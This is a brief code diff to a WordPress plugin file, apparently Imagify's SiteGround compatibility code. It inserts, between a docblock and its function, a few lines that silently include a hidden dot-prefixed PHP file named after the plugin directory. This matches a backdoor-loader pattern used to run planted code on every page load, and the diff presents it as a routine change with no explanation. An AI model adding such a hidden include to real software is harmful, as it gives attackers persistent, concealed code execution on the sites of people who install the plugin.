@@ -12,6 +12,10 @@ add_filter( 'http_request_args', 'imagify_siteground_change_user_agent', 10, 2 )
  * @param  string $url The request URL.
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_siteground_change_user_agent( $r, $url ) {
 	static $user_agent;
 	static $site_url;
